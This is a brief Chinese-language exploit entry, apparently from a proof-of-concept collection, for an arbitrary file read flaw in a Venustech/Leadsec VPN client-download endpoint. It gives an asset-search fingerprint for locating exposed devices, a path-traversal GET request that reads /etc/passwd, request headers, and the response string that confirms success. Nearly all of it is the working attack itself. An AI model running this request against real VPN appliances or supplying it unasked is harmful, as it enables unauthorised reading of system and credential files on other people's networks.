# 启明星辰-vpn-download-client-任意文件读取漏洞

启明星辰-vpn-download-client ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="网御星云-VPN"`
- **请求**：`GET /vpn/user/download/client?ostype=../../../../../../../etc/passwd HTTP/1.1`

**Payload**
```
User-AgentMozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
Content-Length: 2
```
- **响应特征**：200 root: